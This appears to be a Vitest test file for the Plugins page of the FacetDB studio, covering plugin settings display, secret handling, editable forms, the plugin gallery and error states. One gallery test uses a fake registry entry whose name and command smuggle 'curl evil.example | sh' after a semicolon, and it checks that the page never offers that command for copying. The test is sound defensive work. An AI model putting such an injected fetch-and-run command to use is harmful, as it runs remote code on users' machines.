import { render, screen, waitFor, within } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { ApiError, type Gallery, type InstalledPlugins } from "../../api/index.ts";
import { fakeApi, renderStudio, SAMPLE_GALLERY, SAMPLE_PLUGINS } from "../../testing/index.ts";
import { WorkerProblem } from "./WorkerProblem.tsx";

/**
 * The Plugins page on happy-dom with the fake API client and the mockup's sample plugins: each
 * installed plugin on one line with its settings behind it, closed; a secret as its variable and
 * whether it is set, never a value or an input; an endpoint as its host; a range that no longer
 * holds; a shape the form cannot draw sent to the file with its path; the settings a plugin marks
 * editable as controls saved through Apply's diff; and the gallery with its search, verified marks,
 * downloads, "Installed" or the add command with Copy. Then each state the mockup switches: nothing
 * installed, loading, the registry unreachable, the worker not answering.
 */

/** A plugin's line: the summary that opens its settings, found by the plugin's name. */
function lineOf(name: string): HTMLElement {
  const line = [...document.querySelectorAll("summary")].find(
    (summary) => summary.firstElementChild?.textContent === name,
  );
  if (line === undefined) {
    throw new Error(`no line opens the settings of ${name}`);
  }
  return line;
}

/** What a plugin's line opens: its details element. */
function settingsOf(name: string): HTMLElement {
  return lineOf(name).parentElement as HTMLElement;
}

/** The installed plugins have been read and listed (the loading state has a heading of its own). */
async function listed() {
  await screen.findByText(/^Settings are changed in facetdb\.config\.ts/);
}

async function opened() {
  const rendered = renderStudio({ path: "/plugins", api: fakeApi() });
  await listed();
  return rendered;
}

/** The sample gallery's entries, changed as a test needs. */
function galleryWith(
  change: (
    entries: Extract<Gallery, { reachable: true }>["plugins"],
  ) => Extract<Gallery, { reachable: true }>["plugins"],
): Gallery {
  if (!SAMPLE_GALLERY.reachable) {
    throw new Error("the sample gallery is reachable");
  }
  return { ...SAMPLE_GALLERY, plugins: change(SAMPLE_GALLERY.plugins) };
}

/** The sample with one plugin's settings replaced. */
function withPlugin(
  name: string,
  settings: Partial<InstalledPlugins["plugins"][number]["settings"]>,
): InstalledPlugins {
  return {
    ...SAMPLE_PLUGINS,
    plugins: SAMPLE_PLUGINS.plugins.map((plugin) =>
      plugin.name === name ? { ...plugin, settings: { ...plugin.settings, ...settings } } : plugin,
    ),
  };
}

describe("the installed plugins", () => {
  it("puts each on one line, its settings behind it and closed, and says once where they change", async () => {
    await opened();

    expect(document.title).toBe("Plugins · FacetDB");
    expect(
      screen.getAllByText(
        "Settings are changed in facetdb.config.ts, since they can decide where a token or your data goes. A plugin can mark some editable here.",
      ),
    ).toHaveLength(1);
    const github = lineOf("github");
    expect(github).toHaveTextContent(
      "github Source: issues · Actions: label, comment, assign · Pack: triage 0.4.0",
    );
    expect(lineOf("webhook")).toHaveTextContent(
      "webhook Action: send · Alert channel: webhook built in",
    );
    // Closed by default: the settings are in the page, not shown.
    expect(settingsOf("github")).not.toHaveAttribute("open");
    expect(within(settingsOf("github")).getByText("GITHUB_TOKEN")).not.toBeVisible();
    // A plugin with nothing behind it is a line that opens nothing.
    expect(screen.getByText("No settings")).toBeVisible();
    expect(() => lineOf("packs")).toThrow();
    // A badge only where the core range no longer holds.
    expect(within(lineOf("linear")).getByText("Not made for FacetDB 0.4")).toBeVisible();
    expect(within(github).queryByText(/Not made for/)).toBeNull();
  });

  it("shows a secret as its variable and whether it is set, never a value and never an input", async () => {
    const { user } = await opened();
    await user.click(lineOf("github"));

    const github = within(settingsOf("github"));
    expect(settingsOf("github")).toHaveAttribute("open");
    const token = github.getByText("GITHUB_TOKEN").parentElement as HTMLElement;
    expect(token).toHaveTextContent("from GITHUB_TOKEN set");
    const hookSecret = github.getByText("GITHUB_WEBHOOK_SECRET").parentElement as HTMLElement;
    expect(hookSecret).toHaveTextContent("from GITHUB_WEBHOOK_SECRET not set");
    expect(
      github.getByText("Set it where the worker runs, then restart the worker."),
    ).toBeVisible();
    expect(
      github.getAllByText("Set it where the worker runs, then restart the worker."),
    ).toHaveLength(1);
    // A setting the file does not write.
    expect(github.getByText("apiUrl").closest("dt")?.nextElementSibling).toHaveTextContent(
      "not set",
    );
    // Nothing of a plugin that marks no setting editable is a control.
    expect(github.queryByRole("textbox")).toBeNull();
    expect(github.queryByRole("button")).toBeNull();
    expect(github.queryByRole("form")).toBeNull();
  });

  it("shows the webhook's endpoint by its name and host, and the plugin's default where the file writes none", async () => {
    const { user } = await opened();
    await user.click(lineOf("webhook"));
    await user.click(lineOf("email"));
    await user.click(lineOf("slack"));

    const webhook = within(settingsOf("webhook"));
    expect(webhook.getByText("ops").parentElement).toHaveTextContent("ops at hooks.example.com");
    // One written `{ url, allowPrivate: true }`: its host, and the flag in words.
    expect(webhook.getByText("lan").parentElement).toHaveTextContent(
      "lan at 10.0.0.9:8443 private network allowed",
    );
    expect(document.body.textContent).not.toContain("https://hooks");
    const email = within(settingsOf("email"));
    expect(email.getByText("secure").closest("dt")?.nextElementSibling).toHaveTextContent("off");
    expect(email.getByText("smtp.example.com")).toBeVisible();
    expect(email.getByText("587")).toBeVisible();
    expect(email.getByText("EMAIL_PASSWORD").parentElement).toHaveTextContent(
      "from EMAIL_PASSWORD set",
    );
    // A map the file does not write has none.
    const slack = within(settingsOf("slack"));
    expect(slack.getByText("webhooks").closest("dt")?.nextElementSibling).toHaveTextContent("none");
  });

  it("says what range a plugin was made for, the FacetDB this project runs, and what to do", async () => {
    const { user } = await opened();
    await user.click(lineOf("linear"));

    expect(
      within(settingsOf("linear"))
        .getByText(/^Made for FacetDB/)
        .closest("p"),
    ).toHaveTextContent(
      "Made for FacetDB >=0.2.0 <0.4.0; this project runs 0.4.0. Install a release made for 0.4, or ask the plugin's author for one.",
    );
  });

  it("sends a shape the form cannot draw to the file with its path, never a blank and never dropped", async () => {
    const api = fakeApi({
      plugins: () =>
        Promise.resolve(
          withPlugin("linear", {
            // zod could not write this plugin's schema: each setting the file writes is the file's.
            schema: null,
            values: { team: "MKT", hooks: [{ secret: { env: "HOOK_SECRET" } }] },
            variables: [
              { path: "hooks[0].secret", variable: "HOOK_SECRET", secret: true, set: false },
            ],
          }),
        ),
    });
    const { user } = renderStudio({ path: "/plugins", api });
    await listed();
    await user.click(lineOf("discord"));
    await user.click(lineOf("linear"));

    const discord = within(settingsOf("discord"));
    expect(discord.getByText("embeds").closest("dt")?.nextElementSibling).toHaveTextContent(
      "Edit this setting in facetdb.config.ts, at plugins.discord.embeds.",
    );
    const linear = within(settingsOf("linear"));
    expect(linear.getByText("team").closest("dt")?.nextElementSibling).toHaveTextContent(
      "Edit this setting in facetdb.config.ts, at plugins.linear.team.",
    );
    // A variable inside such a setting is still its name and whether it is set.
    expect(linear.getByText("hooks").closest("dt")?.nextElementSibling).toHaveTextContent(
      "Edit this setting in facetdb.config.ts, at plugins.linear.hooks.hooks[0].secret from HOOK_SECRET not set",
    );
  });
});

describe("a plugin's editable settings", () => {
  it("are controls, saved through Apply with the file's diff first and the reload's words after", async () => {
    const api = fakeApi();
    const { user } = renderStudio({ path: "/plugins", api });
    await listed();
    await user.click(lineOf("discord"));
    const form = within(screen.getByRole("form", { name: "discord's settings" }));

    // A secret in an editable plugin is still its variable, never a box.
    expect(form.getByText("DISCORD_WEBHOOK_ALERTS").parentElement).toHaveTextContent(
      "from DISCORD_WEBHOOK_ALERTS set",
    );
    const username = form.getByLabelText("username");
    expect(username).toHaveValue("FacetDB");
    expect(form.getByRole("combobox", { name: "style" })).toHaveTextContent("compact");
    expect(form.getByRole("textbox", { name: "mentionRoles, the first" })).toHaveValue("oncall");

    await user.clear(username);
    await user.type(username, "Marketplace alerts");
    await user.click(form.getByRole("button", { name: "Add to mentionRoles" }));
    const second = form.getByRole("textbox", { name: "mentionRoles, the second" });
    expect(second).toHaveFocus();
    await user.type(second, "trust-and-safety");
    expect(form.getByRole("status")).toHaveTextContent("2 changes");

    await user.click(form.getByRole("button", { name: "Apply" }));
    const dialog = within(await screen.findByRole("dialog", { name: "Apply discord's settings" }));
    expect(
      await dialog.findByRole("region", { name: "Changes to facetdb.config.ts" }),
    ).toHaveTextContent('+ username: "Marketplace alerts",');
    expect(
      dialog.getByText("Writes facetdb.config.ts. The worker reloads it with no restart."),
    ).toBeVisible();
    // The whole entry, every variable where the file writes it, each key in its place.
    expect(api.calls).toContain(
      `applyPluginsDiff ${JSON.stringify({
        discord: {
          webhooks: { "#alerts": { env: "DISCORD_WEBHOOK_ALERTS" } },
          username: "Marketplace alerts",
          style: "compact",
          mentionRoles: ["oncall", "trust-and-safety"],
          embeds: [{ title: "FacetDB" }],
        },
      })}`,
    );
    expect(api.calls.some((call) => call.startsWith("applyPluginsWrite"))).toBe(false);
    const readsBefore = api.calls.filter((call) => call === "plugins").length;

    await user.click(dialog.getByRole("button", { name: "Write facetdb.config.ts" }));

    expect(await dialog.findByText("Written.")).toBeVisible();
    // What the reload did, in its own words.
    expect(
      dialog.getByText(/^The settings of the plugin facetdb-plugin-discord .* are in force now/),
    ).toBeVisible();
    expect(
      api.calls
        .filter((call) => call.startsWith("applyPluginsWrite"))
        .map((call) => JSON.parse(call.slice("applyPluginsWrite ".length))),
    ).toMatchObject([{ plan: "plan-plugins", force: false }]);
    // The plugins are read again: the page shows the settings the worker now runs.
    await waitFor(() => {
      expect(api.calls.filter((call) => call === "plugins").length).toBeGreaterThan(readsBefore);
    });
  });

  it("draws a number, on or off, a map of text, a choice that may be unset and an object's fields, and sends each change in its place", async () => {
    const tuning: InstalledPlugins["plugins"][number] = {
      name: "tuning",
      key: "facetdb-plugin-tuning",
      version: "1.0.0",
      builtIn: false,
      provides: { source: [], action: ["tune"], channel: [], provider: [], pack: [] },
      core: { range: "*", holds: true },
      settings: {
        schema: {
          type: "object",
          properties: {
            limits: {
              type: "object",
              editable: true,
              properties: { perMinute: { type: "integer" }, burst: { type: "number" } },
            },
            labels: {
              type: "object",
              propertyNames: { type: "string" },
              additionalProperties: { type: "string" },
              editable: true,
            },
            quiet: { default: false, type: "boolean", editable: true },
            mode: {
              anyOf: [{ type: "string", enum: ["fast", "careful"] }, { type: "null" }],
              editable: true,
            },
            either: { type: ["string", "number"], editable: true },
            room: { type: "string", editable: true },
          },
          required: ["room"],
        },
        values: { limits: { perMinute: 60 }, labels: { bug: "Bug" }, room: "ops" },
        variables: [],
        hostOnly: [],
      },
    };
    const api = fakeApi({
      plugins: () => Promise.resolve({ facetdb: "0.4.0", plugins: [tuning] }),
    });
    const { user } = renderStudio({ path: "/plugins", api });
    await listed();
    await user.click(lineOf("tuning"));
    const form = within(screen.getByRole("form", { name: "tuning's settings" }));

    expect(form.getByLabelText("limits.perMinute")).toHaveValue("60");
    expect(form.getByLabelText("limits.burst")).toHaveValue("");
    expect(form.getByLabelText("quiet")).not.toBeChecked();
    expect(form.getByRole("textbox", { name: "labels, the key of the first" })).toHaveValue("bug");
    expect(form.getByRole("textbox", { name: "labels, the value of the first" })).toHaveValue(
      "Bug",
    );
    expect(form.getByRole("combobox", { name: "mode" })).toHaveTextContent("not set");
    expect(form.getByText("either").closest("dt")?.nextElementSibling).toHaveTextContent(
      "Edit this setting in facetdb.config.ts, at plugins.facetdb-plugin-tuning.either.",
    );

    // A setting the plugin requires, with no default of its own, says so as soon as it is emptied;
    // one with a default (or not required) does not.
    const room = form.getByLabelText("room");
    await user.clear(room);
    expect(room).toHaveAttribute("aria-invalid", "true");
    expect(room).toHaveAccessibleDescription("Required");
    await user.clear(form.getByLabelText("limits.perMinute"));
    expect(form.getAllByText("Required")).toHaveLength(1);
    await user.type(room, "ops");
    expect(form.queryByText("Required")).toBeNull();
    expect(room).toHaveAttribute("aria-invalid", "false");

    await user.clear(form.getByLabelText("limits.perMinute"));
    await user.type(form.getByLabelText("limits.perMinute"), "120");
    await user.click(form.getByLabelText("quiet"));
    await user.click(form.getByRole("button", { name: "Add to labels" }));
    const key = form.getByRole("textbox", { name: "labels, the key of the second" });
    expect(key).toHaveFocus();
    await user.type(key, "feature");
    await user.type(
      form.getByRole("textbox", { name: "labels, the value of the second" }),
      "Feature",
    );
    expect(form.getByRole("status")).toHaveTextContent("3 changes");

    await user.click(form.getByRole("button", { name: "Apply" }));
    await screen.findByRole("dialog", { name: "Apply tuning's settings" });
    expect(api.calls).toContain(
      `applyPluginsDiff ${JSON.stringify({
        "facetdb-plugin-tuning": {
          limits: { perMinute: 120 },
          labels: { bug: "Bug", feature: "Feature" },
          room: "ops",
          quiet: true,
        },
      })}`,
    );
  });

  it("gives the focus back to Apply when its dialog closes, by Cancel or by Escape", async () => {
    const { user } = await opened();
    await user.click(lineOf("discord"));
    const form = within(screen.getByRole("form", { name: "discord's settings" }));
    const apply = form.getByRole("button", { name: "Apply" });

    await user.click(apply);
    const dialog = within(await screen.findByRole("dialog", { name: "Apply discord's settings" }));
    await user.click(dialog.getByRole("button", { name: "Cancel" }));
    await waitFor(() => {
      expect(screen.queryByRole("dialog")).toBeNull();
    });
    await waitFor(() => {
      expect(apply).toHaveFocus();
    });

    await user.keyboard("{Enter}");
    await screen.findByRole("dialog", { name: "Apply discord's settings" });
    await user.keyboard("{Escape}");
    await waitFor(() => {
      expect(screen.queryByRole("dialog")).toBeNull();
    });
    await waitFor(() => {
      expect(apply).toHaveFocus();
    });
    // And it stays there once Radix's own return of the focus has run.
    await new Promise((settle) => {
      setTimeout(settle, 20);
    });
    expect(apply).toHaveFocus();
  });

  it("Discard puts every setting back and leaves the focus on Apply", async () => {
    const { user } = await opened();
    await user.click(lineOf("discord"));
    const form = within(screen.getByRole("form", { name: "discord's settings" }));
    await user.type(form.getByLabelText("username"), " bot");
    await user.click(form.getByRole("button", { name: "Remove oncall" }));
    expect(form.getByRole("status")).toHaveTextContent("2 changes");

    await user.click(form.getByRole("button", { name: "Discard" }));

    expect(form.getByLabelText("username")).toHaveValue("FacetDB");
    expect(form.getByRole("textbox", { name: "mentionRoles, the first" })).toHaveValue("oncall");
    expect(form.getByRole("status")).toHaveTextContent("");
    expect(form.queryByRole("button", { name: "Discard" })).toBeNull();
    expect(form.getByRole("button", { name: "Apply" })).toHaveFocus();
  });

  it("reaches every control by Tab, in reading order", async () => {
    const { user } = await opened();
    await user.click(lineOf("discord"));
    expect(lineOf("discord")).toHaveFocus();
    const form = within(screen.getByRole("form", { name: "discord's settings" }));

    const reached: HTMLElement[] = [];
    for (let step = 0; step < 6; step += 1) {
      await user.tab();
      reached.push(document.activeElement as HTMLElement);
    }
    expect(reached).toEqual([
      form.getByLabelText("username"),
      form.getByRole("combobox", { name: "style" }),
      form.getByRole("textbox", { name: "mentionRoles, the first" }),
      form.getByRole("button", { name: "Remove oncall" }),
      form.getByRole("button", { name: "Add to mentionRoles" }),
      form.getByRole("button", { name: "Apply" }),
    ]);
  });
});

describe("the gallery", () => {
  it("shows each entry's name, verified mark, downloads, and Installed or its add command with Copy", async () => {
    const { user, copied } = await opened();

    const github = within(await screen.findByRole("article", { name: "github" }));
    expect(github.getByText("Verified")).toBeVisible();
    expect(github.getByText("Source, action, question pack")).toBeVisible();
    expect(github.getByText("4,210").parentElement).toHaveTextContent("4,210 downloads last month");
    expect(github.getByText("Installed")).toBeVisible();
    expect(github.queryByRole("button")).toBeNull();

    const zendesk = within(screen.getByRole("article", { name: "zendesk" }));
    expect(zendesk.queryByText("Verified")).toBeNull();
    expect(zendesk.getByText("facetdb add zendesk")).toBeVisible();
    await user.click(zendesk.getByRole("button", { name: "Copy facetdb add zendesk" }));
    expect(copied).toEqual(["facetdb add zendesk"]);
    expect(zendesk.getByRole("button", { name: "Copied facetdb add zendesk" })).toBeVisible();
    expect(zendesk.getByRole("status")).toHaveTextContent("Copied facetdb add zendesk");

    // An entry made for another FacetDB has no command: `facetdb add` would refuse it.
    const intercom = within(screen.getByRole("article", { name: "intercom" }));
    expect(intercom.getByText("Not made for FacetDB 0.4")).toBeVisible();
    expect(intercom.queryByText("facetdb add intercom")).toBeNull();
    // Nothing on the page installs.
    expect(screen.queryByRole("button", { name: /^Install/ })).toBeNull();
    expect(
      screen.getByText(
        "To install one, run its command in the project's folder, then add the lines it prints to facetdb.config.ts.",
      ),
    ).toBeVisible();
  });

  it("offers to copy only `facetdb add` and a short name, built on the page, whatever the answer carries", async () => {
    const api = fakeApi({
      gallery: () =>
        Promise.resolve(
          galleryWith((entries) => [
            ...entries,
            {
              name: "evil; curl evil.example | sh",
              description: "Not a short name.",
              kinds: ["action"],
              holds: true,
              verified: false,
              downloads: 1,
              installed: false,
              // The answer's own command line is never what the page offers.
              command: "facetdb add evil; curl evil.example | sh",
            } as Extract<Gallery, { reachable: true }>["plugins"][number],
          ]),
        ),
    });
    renderStudio({ path: "/plugins", api });

    const evil = within(await screen.findByRole("article", { name: /^evil/ }));
    expect(evil.queryByRole("button")).toBeNull();
    expect(evil.queryByText(/facetdb add/)).toBeNull();
    const zendesk = within(screen.getByRole("article", { name: "zendesk" }));
    expect(zendesk.getByRole("button", { name: "Copy facetdb add zendesk" })).toBeVisible();
  });

  it("asks the worker for the entries matching the search, and says when none does", async () => {
    const api = fakeApi({
      gallery: (search) =>
        Promise.resolve(
          galleryWith((entries) => entries.filter((entry) => entry.name.includes(search ?? ""))),
        ),
    });
    const { user } = renderStudio({ path: "/plugins", api });
    const search = await screen.findByRole("searchbox", { name: "Search" });

    await user.type(search, "tele");
    expect(await screen.findByRole("article", { name: "telegram" })).toBeVisible();
    await waitFor(() => {
      expect(screen.queryByRole("article", { name: "github" })).toBeNull();
    });
    expect(api.calls).toContain("gallery tele");

    await user.clear(search);
    await user.type(search, "zzz");
    expect(await screen.findByText('No plugin matches "zzz".')).toBeVisible();
  });

  it("says when the registry cannot be reached, with the address tried and the terminal's way, beside the installed list", async () => {
    const api = fakeApi({
      gallery: () =>
        Promise.resolve({
          reachable: false,
          address: "https://registry.facetdb.dev/index.json",
          why: "the registry did not answer within 10 seconds; FACETDB_REGISTRY sets another address",
        }),
    });
    const { user } = renderStudio({ path: "/plugins", api });

    const problem = await screen.findByRole("alert");
    expect(problem).toHaveTextContent("The registry could not be reached.");
    // The mockup's words, each thing said once.
    expect(problem).toHaveTextContent(
      "No answer from https://registry.facetdb.dev/index.json within 10 seconds. From a terminal, facetdb add lists the registry.",
    );
    expect(within(problem).getByText("https://registry.facetdb.dev/index.json").tagName).toBe(
      "CODE",
    );
    expect(screen.queryByRole("searchbox")).toBeNull();
    expect(lineOf("github")).toBeVisible();

    const asked = api.calls.filter((call) => call.startsWith("gallery")).length;
    await user.click(within(problem).getByRole("button", { name: "Try again" }));
    await waitFor(() => {
      expect(api.calls.filter((call) => call.startsWith("gallery")).length).toBeGreaterThan(asked);
    });
  });
});

describe("the page's other states", () => {
  it("with nothing installed keeps one empty state, the gallery under it", async () => {
    const api = fakeApi({
      plugins: () => Promise.resolve({ facetdb: "0.4.0", plugins: [] }),
      gallery: () =>
        Promise.resolve(
          galleryWith((entries) => entries.map((entry) => ({ ...entry, installed: false }))),
        ),
    });
    const { user } = renderStudio({ path: "/plugins", api });

    expect(
      await screen.findByRole("heading", { level: 2, name: "No plugin installed" }),
    ).toBeVisible();
    expect(screen.queryByRole("heading", { level: 2, name: "Installed" })).toBeNull();
    expect(
      screen.getByText(
        "Add sources, actions, alert channels and question packs from the gallery below.",
      ),
    ).toBeVisible();
    expect(await screen.findByText("facetdb add github")).toBeVisible();

    await user.click(screen.getByRole("button", { name: "Search the gallery" }));
    expect(screen.getByRole("searchbox", { name: "Search" })).toHaveFocus();
  });

  it("says what it is reading while it reads", async () => {
    const api = fakeApi({
      plugins: () => new Promise(() => undefined),
      gallery: () => new Promise(() => undefined),
    });
    renderStudio({ path: "/plugins", api });

    expect(await screen.findByText("Reading the installed plugins.")).toBeVisible();
    expect(screen.getByText("Reading the registry.")).toBeVisible();
    expect(screen.getByRole("heading", { level: 2, name: "Installed" })).toBeVisible();
    expect(screen.getByRole("heading", { level: 2, name: "Gallery" })).toBeVisible();
  });

  it("says the installed plugins could not be read, in the worker's words, and asks again", async () => {
    let fail = true;
    const api = fakeApi({
      plugins: () =>
        fail
          ? Promise.reject(
              new ApiError(
                500,
                "internal",
                "The worker failed to read its plugins.",
                "Look at the worker's output.",
              ),
            )
          : Promise.resolve(SAMPLE_PLUGINS),
    });
    const { user } = renderStudio({ path: "/plugins", api });

    const problem = await screen.findByRole("alert");
    expect(problem).toHaveTextContent("The installed plugins could not be read.");
    expect(problem).toHaveTextContent(
      "The worker failed to read its plugins. Look at the worker's output.",
    );
    // The gallery is the worker's too: it is not shown under a worker that does not answer.
    expect(screen.queryByRole("heading", { level: 2, name: "Gallery" })).toBeNull();

    fail = false;
    await user.click(within(problem).getByRole("button", { name: "Try again" }));
    expect(await screen.findByRole("heading", { level: 2, name: "Installed" })).toBeVisible();
    expect(screen.queryByRole("alert")).toBeNull();
  });

  it("says a worker that cannot be reached at all, and how to start it", () => {
    render(
      <WorkerProblem
        what="The installed plugins"
        error={new TypeError("Failed to fetch")}
        stale={false}
        retry={() => undefined}
      />,
    );
    const problem = screen.getByRole("alert");
    expect(problem).toHaveTextContent("The installed plugins could not be read.");
    expect(problem).toHaveTextContent(
      "The studio cannot reach the worker. Check that it is running (facetdb worker) and that this computer is online.",
    );
    expect(within(problem).getByRole("button", { name: "Try again" })).toBeInTheDocument();
  });
});
